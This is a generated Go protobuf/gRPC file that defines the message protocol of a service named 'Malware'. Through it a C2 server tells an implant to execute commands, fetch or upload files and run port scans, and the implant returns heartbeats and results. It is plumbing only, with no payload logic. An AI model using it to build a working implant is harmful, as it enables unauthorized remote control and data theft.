// Code generated by protoc-gen-go. DO NOT EDIT.
// source: common/messages/messages.proto

package messages

import (
	context "context"
	fmt "fmt"
	proto "github.com/golang/protobuf/proto"
	grpc "google.golang.org/grpc"
	codes "google.golang.org/grpc/codes"
	status "google.golang.org/grpc/status"
	math "math"
)

// Reference imports to suppress errors if they are not otherwise used.
var _ = proto.Marshal
var _ = fmt.Errorf
var _ = math.Inf

// This is a compile-time assertion to ensure that this generated file
// is compatible with the proto package it is being compiled against.
// A compilation error at this line likely means your copy of the
// proto package needs to be updated.
const _ = proto.ProtoPackageIsVersion3 // please upgrade the proto package

type PortScanReply_Status int32

const (
	PortScanReply_IN_PROGRESS PortScanReply_Status = 0
	PortScanReply_ERROR       PortScanReply_Status = 1
	PortScanReply_COMPLETE    PortScanReply_Status = 2
)

var PortScanReply_Status_name = map[int32]string{
	0: "IN_PROGRESS",
	1: "ERROR",
	2: "COMPLETE",
}

var PortScanReply_Status_value = map[string]int32{
	"IN_PROGRESS": 0,
	"ERROR":       1,
	"COMPLETE":    2,
}

func (x PortScanReply_Status) String() string {
	return proto.EnumName(PortScanReply_Status_name, int32(x))
}

func (PortScanReply_Status) EnumDescriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{1, 0}
}

type ImplantReply struct {
	Module               string         `protobuf:"bytes,1,opt,name=module,proto3" json:"module,omitempty"`
	Args                 []byte         `protobuf:"bytes,2,opt,name=args,proto3" json:"args,omitempty"`
	Portscan             *PortScanReply `protobuf:"bytes,3,opt,name=portscan,proto3" json:"portscan,omitempty"`
	Error                int32          `protobuf:"varint,4,opt,name=error,proto3" json:"error,omitempty"`
	XXX_NoUnkeyedLiteral struct{}       `json:"-"`
	XXX_unrecognized     []byte         `json:"-"`
	XXX_sizecache        int32          `json:"-"`
}

func (m *ImplantReply) Reset()         { *m = ImplantReply{} }
func (m *ImplantReply) String() string { return proto.CompactTextString(m) }
func (*ImplantReply) ProtoMessage()    {}
func (*ImplantReply) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{0}
}

func (m *ImplantReply) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_ImplantReply.Unmarshal(m, b)
}
func (m *ImplantReply) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_ImplantReply.Marshal(b, m, deterministic)
}
func (m *ImplantReply) XXX_Merge(src proto.Message) {
	xxx_messageInfo_ImplantReply.Merge(m, src)
}
func (m *ImplantReply) XXX_Size() int {
	return xxx_messageInfo_ImplantReply.Size(m)
}
func (m *ImplantReply) XXX_DiscardUnknown() {
	xxx_messageInfo_ImplantReply.DiscardUnknown(m)
}

var xxx_messageInfo_ImplantReply proto.InternalMessageInfo

func (m *ImplantReply) GetModule() string {
	if m != nil {
		return m.Module
	}
	return ""
}

func (m *ImplantReply) GetArgs() []byte {
	if m != nil {
		return m.Args
	}
	return nil
}

func (m *ImplantReply) GetPortscan() *PortScanReply {
	if m != nil {
		return m.Portscan
	}
	return nil
}

func (m *ImplantReply) GetError() int32 {
	if m != nil {
		return m.Error
	}
	return 0
}

type PortScanReply struct {
	Status               PortScanReply_Status `protobuf:"varint,1,opt,name=status,proto3,enum=messages.PortScanReply_Status" json:"status,omitempty"`
	Found                int32                `protobuf:"varint,2,opt,name=found,proto3" json:"found,omitempty"`
	XXX_NoUnkeyedLiteral struct{}             `json:"-"`
	XXX_unrecognized     []byte               `json:"-"`
	XXX_sizecache        int32                `json:"-"`
}

func (m *PortScanReply) Reset()         { *m = PortScanReply{} }
func (m *PortScanReply) String() string { return proto.CompactTextString(m) }
func (*PortScanReply) ProtoMessage()    {}
func (*PortScanReply) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{1}
}

func (m *PortScanReply) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_PortScanReply.Unmarshal(m, b)
}
func (m *PortScanReply) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_PortScanReply.Marshal(b, m, deterministic)
}
func (m *PortScanReply) XXX_Merge(src proto.Message) {
	xxx_messageInfo_PortScanReply.Merge(m, src)
}
func (m *PortScanReply) XXX_Size() int {
	return xxx_messageInfo_PortScanReply.Size(m)
}
func (m *PortScanReply) XXX_DiscardUnknown() {
	xxx_messageInfo_PortScanReply.DiscardUnknown(m)
}

var xxx_messageInfo_PortScanReply proto.InternalMessageInfo

func (m *PortScanReply) GetStatus() PortScanReply_Status {
	if m != nil {
		return m.Status
	}
	return PortScanReply_IN_PROGRESS
}

func (m *PortScanReply) GetFound() int32 {
	if m != nil {
		return m.Found
	}
	return 0
}

type Exec struct {
	Exec                 string   `protobuf:"bytes,1,opt,name=Exec,proto3" json:"Exec,omitempty"`
	Args                 []string `protobuf:"bytes,2,rep,name=Args,proto3" json:"Args,omitempty"`
	XXX_NoUnkeyedLiteral struct{} `json:"-"`
	XXX_unrecognized     []byte   `json:"-"`
	XXX_sizecache        int32    `json:"-"`
}

func (m *Exec) Reset()         { *m = Exec{} }
func (m *Exec) String() string { return proto.CompactTextString(m) }
func (*Exec) ProtoMessage()    {}
func (*Exec) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{2}
}

func (m *Exec) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_Exec.Unmarshal(m, b)
}
func (m *Exec) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_Exec.Marshal(b, m, deterministic)
}
func (m *Exec) XXX_Merge(src proto.Message) {
	xxx_messageInfo_Exec.Merge(m, src)
}
func (m *Exec) XXX_Size() int {
	return xxx_messageInfo_Exec.Size(m)
}
func (m *Exec) XXX_DiscardUnknown() {
	xxx_messageInfo_Exec.DiscardUnknown(m)
}

var xxx_messageInfo_Exec proto.InternalMessageInfo

func (m *Exec) GetExec() string {
	if m != nil {
		return m.Exec
	}
	return ""
}

func (m *Exec) GetArgs() []string {
	if m != nil {
		return m.Args
	}
	return nil
}

type PortScan struct {
	Ip                   string   `protobuf:"bytes,1,opt,name=ip,proto3" json:"ip,omitempty"`
	StartPort            int32    `protobuf:"varint,2,opt,name=startPort,proto3" json:"startPort,omitempty"`
	EndPort              int32    `protobuf:"varint,3,opt,name=endPort,proto3" json:"endPort,omitempty"`
	Cancel               bool     `protobuf:"varint,4,opt,name=cancel,proto3" json:"cancel,omitempty"`
	XXX_NoUnkeyedLiteral struct{} `json:"-"`
	XXX_unrecognized     []byte   `json:"-"`
	XXX_sizecache        int32    `json:"-"`
}

func (m *PortScan) Reset()         { *m = PortScan{} }
func (m *PortScan) String() string { return proto.CompactTextString(m) }
func (*PortScan) ProtoMessage()    {}
func (*PortScan) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{3}
}

func (m *PortScan) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_PortScan.Unmarshal(m, b)
}
func (m *PortScan) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_PortScan.Marshal(b, m, deterministic)
}
func (m *PortScan) XXX_Merge(src proto.Message) {
	xxx_messageInfo_PortScan.Merge(m, src)
}
func (m *PortScan) XXX_Size() int {
	return xxx_messageInfo_PortScan.Size(m)
}
func (m *PortScan) XXX_DiscardUnknown() {
	xxx_messageInfo_PortScan.DiscardUnknown(m)
}

var xxx_messageInfo_PortScan proto.InternalMessageInfo

func (m *PortScan) GetIp() string {
	if m != nil {
		return m.Ip
	}
	return ""
}

func (m *PortScan) GetStartPort() int32 {
	if m != nil {
		return m.StartPort
	}
	return 0
}

func (m *PortScan) GetEndPort() int32 {
	if m != nil {
		return m.EndPort
	}
	return 0
}

func (m *PortScan) GetCancel() bool {
	if m != nil {
		return m.Cancel
	}
	return false
}

type GetFile struct {
	Filename             string   `protobuf:"bytes,1,opt,name=filename,proto3" json:"filename,omitempty"`
	XXX_NoUnkeyedLiteral struct{} `json:"-"`
	XXX_unrecognized     []byte   `json:"-"`
	XXX_sizecache        int32    `json:"-"`
}

func (m *GetFile) Reset()         { *m = GetFile{} }
func (m *GetFile) String() string { return proto.CompactTextString(m) }
func (*GetFile) ProtoMessage()    {}
func (*GetFile) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{4}
}

func (m *GetFile) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_GetFile.Unmarshal(m, b)
}
func (m *GetFile) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_GetFile.Marshal(b, m, deterministic)
}
func (m *GetFile) XXX_Merge(src proto.Message) {
	xxx_messageInfo_GetFile.Merge(m, src)
}
func (m *GetFile) XXX_Size() int {
	return xxx_messageInfo_GetFile.Size(m)
}
func (m *GetFile) XXX_DiscardUnknown() {
	xxx_messageInfo_GetFile.DiscardUnknown(m)
}

var xxx_messageInfo_GetFile proto.InternalMessageInfo

func (m *GetFile) GetFilename() string {
	if m != nil {
		return m.Filename
	}
	return ""
}

type UploadFile struct {
	Filename             string   `protobuf:"bytes,1,opt,name=filename,proto3" json:"filename,omitempty"`
	Contents             []byte   `protobuf:"bytes,2,opt,name=contents,proto3" json:"contents,omitempty"`
	XXX_NoUnkeyedLiteral struct{} `json:"-"`
	XXX_unrecognized     []byte   `json:"-"`
	XXX_sizecache        int32    `json:"-"`
}

func (m *UploadFile) Reset()         { *m = UploadFile{} }
func (m *UploadFile) String() string { return proto.CompactTextString(m) }
func (*UploadFile) ProtoMessage()    {}
func (*UploadFile) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{5}
}

func (m *UploadFile) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_UploadFile.Unmarshal(m, b)
}
func (m *UploadFile) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_UploadFile.Marshal(b, m, deterministic)
}
func (m *UploadFile) XXX_Merge(src proto.Message) {
	xxx_messageInfo_UploadFile.Merge(m, src)
}
func (m *UploadFile) XXX_Size() int {
	return xxx_messageInfo_UploadFile.Size(m)
}
func (m *UploadFile) XXX_DiscardUnknown() {
	xxx_messageInfo_UploadFile.DiscardUnknown(m)
}

var xxx_messageInfo_UploadFile proto.InternalMessageInfo

func (m *UploadFile) GetFilename() string {
	if m != nil {
		return m.Filename
	}
	return ""
}

func (m *UploadFile) GetContents() []byte {
	if m != nil {
		return m.Contents
	}
	return nil
}

// Implant -> C2
type CheckCmdRequest struct {
	// Types that are valid to be assigned to Message:
	//	*CheckCmdRequest_Heartbeat
	//	*CheckCmdRequest_Reply
	Message              isCheckCmdRequest_Message `protobuf_oneof:"message"`
	XXX_NoUnkeyedLiteral struct{}                  `json:"-"`
	XXX_unrecognized     []byte                    `json:"-"`
	XXX_sizecache        int32                     `json:"-"`
}

func (m *CheckCmdRequest) Reset()         { *m = CheckCmdRequest{} }
func (m *CheckCmdRequest) String() string { return proto.CompactTextString(m) }
func (*CheckCmdRequest) ProtoMessage()    {}
func (*CheckCmdRequest) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{6}
}

func (m *CheckCmdRequest) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_CheckCmdRequest.Unmarshal(m, b)
}
func (m *CheckCmdRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_CheckCmdRequest.Marshal(b, m, deterministic)
}
func (m *CheckCmdRequest) XXX_Merge(src proto.Message) {
	xxx_messageInfo_CheckCmdRequest.Merge(m, src)
}
func (m *CheckCmdRequest) XXX_Size() int {
	return xxx_messageInfo_CheckCmdRequest.Size(m)
}
func (m *CheckCmdRequest) XXX_DiscardUnknown() {
	xxx_messageInfo_CheckCmdRequest.DiscardUnknown(m)
}

var xxx_messageInfo_CheckCmdRequest proto.InternalMessageInfo

type isCheckCmdRequest_Message interface {
	isCheckCmdRequest_Message()
}

type CheckCmdRequest_Heartbeat struct {
	Heartbeat int64 `protobuf:"varint,1,opt,name=heartbeat,proto3,oneof"`
}

type CheckCmdRequest_Reply struct {
	Reply *ImplantReply `protobuf:"bytes,2,opt,name=reply,proto3,oneof"`
}

func (*CheckCmdRequest_Heartbeat) isCheckCmdRequest_Message() {}

func (*CheckCmdRequest_Reply) isCheckCmdRequest_Message() {}

func (m *CheckCmdRequest) GetMessage() isCheckCmdRequest_Message {
	if m != nil {
		return m.Message
	}
	return nil
}

func (m *CheckCmdRequest) GetHeartbeat() int64 {
	if x, ok := m.GetMessage().(*CheckCmdRequest_Heartbeat); ok {
		return x.Heartbeat
	}
	return 0
}

func (m *CheckCmdRequest) GetReply() *ImplantReply {
	if x, ok := m.GetMessage().(*CheckCmdRequest_Reply); ok {
		return x.Reply
	}
	return nil
}

// XXX_OneofWrappers is for the internal use of the proto package.
func (*CheckCmdRequest) XXX_OneofWrappers() []interface{} {
	return []interface{}{
		(*CheckCmdRequest_Heartbeat)(nil),
		(*CheckCmdRequest_Reply)(nil),
	}
}

// C2 -> Implant
type CheckCmdReply struct {
	// Types that are valid to be assigned to Message:
	//	*CheckCmdReply_Heartbeat
	//	*CheckCmdReply_Exec
	//	*CheckCmdReply_Getfile
	//	*CheckCmdReply_Uploadfile
	//	*CheckCmdReply_Portscan
	Message              isCheckCmdReply_Message `protobuf_oneof:"message"`
	XXX_NoUnkeyedLiteral struct{}                `json:"-"`
	XXX_unrecognized     []byte                  `json:"-"`
	XXX_sizecache        int32                   `json:"-"`
}

func (m *CheckCmdReply) Reset()         { *m = CheckCmdReply{} }
func (m *CheckCmdReply) String() string { return proto.CompactTextString(m) }
func (*CheckCmdReply) ProtoMessage()    {}
func (*CheckCmdReply) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{7}
}

func (m *CheckCmdReply) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_CheckCmdReply.Unmarshal(m, b)
}
func (m *CheckCmdReply) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_CheckCmdReply.Marshal(b, m, deterministic)
}
func (m *CheckCmdReply) XXX_Merge(src proto.Message) {
	xxx_messageInfo_CheckCmdReply.Merge(m, src)
}
func (m *CheckCmdReply) XXX_Size() int {
	return xxx_messageInfo_CheckCmdReply.Size(m)
}
func (m *CheckCmdReply) XXX_DiscardUnknown() {
	xxx_messageInfo_CheckCmdReply.DiscardUnknown(m)
}

var xxx_messageInfo_CheckCmdReply proto.InternalMessageInfo

type isCheckCmdReply_Message interface {
	isCheckCmdReply_Message()
}

type CheckCmdReply_Heartbeat struct {
	Heartbeat int64 `protobuf:"varint,1,opt,name=heartbeat,proto3,oneof"`
}

type CheckCmdReply_Exec struct {
	Exec *Exec `protobuf:"bytes,2,opt,name=exec,proto3,oneof"`
}

type CheckCmdReply_Getfile struct {
	Getfile *GetFile `protobuf:"bytes,3,opt,name=getfile,proto3,oneof"`
}

type CheckCmdReply_Uploadfile struct {
	Uploadfile *UploadFile `protobuf:"bytes,4,opt,name=uploadfile,proto3,oneof"`
}

type CheckCmdReply_Portscan struct {
	Portscan *PortScan `protobuf:"bytes,5,opt,name=portscan,proto3,oneof"`
}

func (*CheckCmdReply_Heartbeat) isCheckCmdReply_Message() {}

func (*CheckCmdReply_Exec) isCheckCmdReply_Message() {}

func (*CheckCmdReply_Getfile) isCheckCmdReply_Message() {}

func (*CheckCmdReply_Uploadfile) isCheckCmdReply_Message() {}

func (*CheckCmdReply_Portscan) isCheckCmdReply_Message() {}

func (m *CheckCmdReply) GetMessage() isCheckCmdReply_Message {
	if m != nil {
		return m.Message
	}
	return nil
}

func (m *CheckCmdReply) GetHeartbeat() int64 {
	if x, ok := m.GetMessage().(*CheckCmdReply_Heartbeat); ok {
		return x.Heartbeat
	}
	return 0
}

func (m *CheckCmdReply) GetExec() *Exec {
	if x, ok := m.GetMessage().(*CheckCmdReply_Exec); ok {
		return x.Exec
	}
	return nil
}

func (m *CheckCmdReply) GetGetfile() *GetFile {
	if x, ok := m.GetMessage().(*CheckCmdReply_Getfile); ok {
		return x.Getfile
	}
	return nil
}

func (m *CheckCmdReply) GetUploadfile() *UploadFile {
	if x, ok := m.GetMessage().(*CheckCmdReply_Uploadfile); ok {
		return x.Uploadfile
	}
	return nil
}

func (m *CheckCmdReply) GetPortscan() *PortScan {
	if x, ok := m.GetMessage().(*CheckCmdReply_Portscan); ok {
		return x.Portscan
	}
	return nil
}

// XXX_OneofWrappers is for the internal use of the proto package.
func (*CheckCmdReply) XXX_OneofWrappers() []interface{} {
	return []interface{}{
		(*CheckCmdReply_Heartbeat)(nil),
		(*CheckCmdReply_Exec)(nil),
		(*CheckCmdReply_Getfile)(nil),
		(*CheckCmdReply_Uploadfile)(nil),
		(*CheckCmdReply_Portscan)(nil),
	}
}

func init() {
	proto.RegisterEnum("messages.PortScanReply_Status", PortScanReply_Status_name, PortScanReply_Status_value)
	proto.RegisterType((*ImplantReply)(nil), "messages.ImplantReply")
	proto.RegisterType((*PortScanReply)(nil), "messages.PortScanReply")
	proto.RegisterType((*Exec)(nil), "messages.Exec")
	proto.RegisterType((*PortScan)(nil), "messages.PortScan")
	proto.RegisterType((*GetFile)(nil), "messages.GetFile")
	proto.RegisterType((*UploadFile)(nil), "messages.UploadFile")
	proto.RegisterType((*CheckCmdRequest)(nil), "messages.CheckCmdRequest")
	proto.RegisterType((*CheckCmdReply)(nil), "messages.CheckCmdReply")
}

func init() { proto.RegisterFile("common/messages/messages.proto", fileDescriptor_8a23ab92aaff7b7b) }

var fileDescriptor_8a23ab92aaff7b7b = []byte{
	// 543 bytes of a gzipped FileDescriptorProto
	0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0xff, 0x84, 0x53, 0xdb, 0x6e, 0xd3, 0x40,
	0x10, 0xb5, 0x93, 0x38, 0x71, 0xa6, 0x6d, 0x9a, 0x8e, 0xaa, 0x36, 0x54, 0x28, 0x8a, 0x2c, 0x90,
	0xf2, 0x42, 0x40, 0xa9, 0xd4, 0x77, 0x08, 0xa1, 0x8e, 0x44, 0x49, 0xd8, 0x94, 0x67, 0xb4, 0xb5,
	0xa7, 0x69, 0xc0, 0xf6, 0x1a, 0x7b, 0x2d, 0xe8, 0x07, 0xf0, 0x01, 0x7c, 0x2e, 0x6f, 0x68, 0xd7,
	0xb7, 0x70, 0x53, 0x9f, 0x76, 0xcf, 0xcc, 0x99, 0xcb, 0xce, 0x99, 0x85, 0xa1, 0x27, 0xc2, 0x50,
	0x44, 0xcf, 0x43, 0x4a, 0x53, 0xbe, 0xa1, 0xb4, 0xba, 0x4c, 0xe2, 0x44, 0x48, 0x81, 0x76, 0x89,
	0x9d, 0xef, 0x26, 0xec, 0x2f, 0xc2, 0x38, 0xe0, 0x91, 0x64, 0x14, 0x07, 0xf7, 0x78, 0x02, 0xed,
	0x50, 0xf8, 0x59, 0x40, 0x03, 0x73, 0x64, 0x8e, 0xbb, 0xac, 0x40, 0x88, 0xd0, 0xe2, 0xc9, 0x26,
	0x1d, 0x34, 0x46, 0xe6, 0x78, 0x9f, 0xe9, 0x3b, 0x9e, 0x83, 0x1d, 0x8b, 0x44, 0xa6, 0x1e, 0x8f,
	0x06, 0xcd, 0x91, 0x39, 0xde, 0x9b, 0x9e, 0x4e, 0xaa, 0x4a, 0x2b, 0x91, 0xc8, 0xb5, 0xc7, 0x23,
	0x9d, 0x96, 0x55, 0x44, 0x3c, 0x06, 0x8b, 0x92, 0x44, 0x24, 0x83, 0xd6, 0xc8, 0x1c, 0x5b, 0x2c,
	0x07, 0xce, 0x0f, 0x13, 0x0e, 0x7e, 0x8b, 0xc0, 0x0b, 0x68, 0xa7, 0x92, 0xcb, 0x2c, 0xd5, 0x8d,
	0xf4, 0xa6, 0xc3, 0xff, 0xa4, 0x9e, 0xac, 0x35, 0x8b, 0x15, 0x6c, 0x95, 0xff, 0x56, 0x64, 0x91,
	0xaf, 0x3b, 0xb5, 0x58, 0x0e, 0x9c, 0x29, 0xb4, 0x73, 0x1e, 0x1e, 0xc2, 0xde, 0xe2, 0xdd, 0xc7,
	0x15, 0x5b, 0x5e, 0xb2, 0xf9, 0x7a, 0xdd, 0x37, 0xb0, 0x0b, 0xd6, 0x9c, 0xb1, 0x25, 0xeb, 0x9b,
	0xb8, 0x0f, 0xf6, 0x6c, 0x79, 0xb5, 0x7a, 0x3b, 0xbf, 0x9e, 0xf7, 0x1b, 0xce, 0x04, 0x5a, 0xf3,
	0x6f, 0xe4, 0xa9, 0xa7, 0xab, 0xb3, 0x18, 0x48, 0x65, 0x7b, 0x99, 0x8f, 0xa3, 0xa9, 0x6c, 0xea,
	0xee, 0x7c, 0x02, 0xbb, 0xec, 0x0c, 0x7b, 0xd0, 0xd8, 0xc6, 0x45, 0x44, 0x63, 0x1b, 0xe3, 0x63,
	0xe8, 0xa6, 0x92, 0x27, 0x52, 0x11, 0x8a, 0xce, 0x6a, 0x03, 0x0e, 0xa0, 0x43, 0x91, 0xaf, 0x7d,
	0x4d, 0xed, 0x2b, 0xa1, 0x92, 0xc3, 0xe3, 0x91, 0x47, 0x81, 0x1e, 0x97, 0xcd, 0x0a, 0xe4, 0x3c,
	0x85, 0xce, 0x25, 0xc9, 0x37, 0xdb, 0x80, 0xf0, 0x0c, 0xec, 0xdb, 0x6d, 0x40, 0x11, 0x0f, 0x4b,
	0xcd, 0x2a, 0xec, 0xbc, 0x06, 0xf8, 0x10, 0x07, 0x82, 0xfb, 0x0f, 0x31, 0x95, 0xcf, 0x13, 0x91,
	0xa4, 0x48, 0x96, 0x1a, 0x57, 0xd8, 0x09, 0xe0, 0x70, 0x76, 0x47, 0xde, 0xe7, 0x59, 0xe8, 0x33,
	0xfa, 0x92, 0x51, 0x2a, 0x71, 0x08, 0xdd, 0x3b, 0xe2, 0x89, 0xbc, 0x21, 0x2e, 0x75, 0xae, 0xa6,
	0x6b, 0xb0, 0xda, 0x84, 0x13, 0xb0, 0x12, 0xa5, 0x8e, 0xce, 0xb5, 0x37, 0x3d, 0xa9, 0xc5, 0xdb,
	0xdd, 0x36, 0xd7, 0x60, 0x39, 0xed, 0x55, 0x17, 0x3a, 0x05, 0xc3, 0xf9, 0x69, 0xc2, 0x41, 0x5d,
	0x4e, 0xad, 0xc2, 0x43, 0xc5, 0x9e, 0x40, 0x8b, 0x94, 0x40, 0x79, 0xad, 0x5e, 0x5d, 0x4b, 0x49,
	0xe5, 0x1a, 0x4c, 0x7b, 0xf1, 0x19, 0x74, 0x36, 0x24, 0xd5, 0x83, 0x8b, 0x65, 0x3d, 0xaa, 0x89,
	0xc5, 0x2c, 0x5d, 0x83, 0x95, 0x1c, 0xbc, 0x00, 0xc8, 0xf4, 0xe8, 0x74, 0x44, 0x4b, 0x47, 0x1c,
	0xd7, 0x11, 0xf5, 0x58, 0x5d, 0x83, 0xed, 0x30, 0xf1, 0xc5, 0xce, 0xa7, 0xb0, 0x74, 0x14, 0xfe,
	0xbd, 0xb9, 0xae, 0x51, 0xff, 0x88, 0x9d, 0xb7, 0x4f, 0xaf, 0xa1, 0x73, 0xc5, 0x83, 0xaf, 0x3c,
	0x21, 0x5c, 0xc0, 0x51, 0x3e, 0x05, 0x11, 0x86, 0x3c, 0xf2, 0xdf, 0x67, 0x94, 0x11, 0x3e, 0xaa,
	0x53, 0xfd, 0xa1, 0xc8, 0xd9, 0xe9, 0xbf, 0x5c, 0x71, 0x70, 0xef, 0x18, 0x37, 0x6d, 0xfd, 0xeb,
	0xcf, 0x7f, 0x05, 0x00, 0x00, 0xff, 0xff, 0x18, 0x7b, 0x4e, 0x8c, 0x17, 0x04, 0x00, 0x00,
}

// Reference imports to suppress errors if they are not otherwise used.
var _ context.Context
var _ grpc.ClientConn

// This is a compile-time assertion to ensure that this generated file
// is compatible with the grpc package it is being compiled against.
const _ = grpc.SupportPackageIsVersion4

// MalwareClient is the client API for Malware service.
//
// For semantics around ctx use and closing/ending streaming RPCs, please refer to https://godoc.org/google.golang.org/grpc#ClientConn.NewStream.
type MalwareClient interface {
	CheckCommandQueue(ctx context.Context, in *CheckCmdRequest, opts ...grpc.CallOption) (*CheckCmdReply, error)
}

type malwareClient struct {
	cc *grpc.ClientConn
}

func NewMalwareClient(cc *grpc.ClientConn) MalwareClient {
	return &malwareClient{cc}
}

func (c *malwareClient) CheckCommandQueue(ctx context.Context, in *CheckCmdRequest, opts ...grpc.CallOption) (*CheckCmdReply, error) {
	out := new(CheckCmdReply)
	err := c.cc.Invoke(ctx, "/messages.Malware/CheckCommandQueue", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

// MalwareServer is the server API for Malware service.
type MalwareServer interface {
	CheckCommandQueue(context.Context, *CheckCmdRequest) (*CheckCmdReply, error)
}

// UnimplementedMalwareServer can be embedded to have forward compatible implementations.
type UnimplementedMalwareServer struct {
}

func (*UnimplementedMalwareServer) CheckCommandQueue(ctx context.Context, req *CheckCmdRequest) (*CheckCmdReply, error) {
	return nil, status.Errorf(codes.Unimplemented, "method CheckCommandQueue not implemented")
}

func RegisterMalwareServer(s *grpc.Server, srv MalwareServer) {
	s.RegisterService(&_Malware_serviceDesc, srv)
}

func _Malware_CheckCommandQueue_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(CheckCmdRequest)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(MalwareServer).CheckCommandQueue(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/messages.Malware/CheckCommandQueue",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(MalwareServer).CheckCommandQueue(ctx, req.(*CheckCmdRequest))
	}
	return interceptor(ctx, in, info, handler)
}

var _Malware_serviceDesc = grpc.ServiceDesc{
	ServiceName: "messages.Malware",
	HandlerType: (*MalwareServer)(nil),
	Methods: []grpc.MethodDesc{
		{
			MethodName: "CheckCommandQueue",
			Handler:    _Malware_CheckCommandQueue_Handler,
		},
	},
	Streams:  []grpc.StreamDesc{},
	Metadata: "common/messages/messages.proto",
}
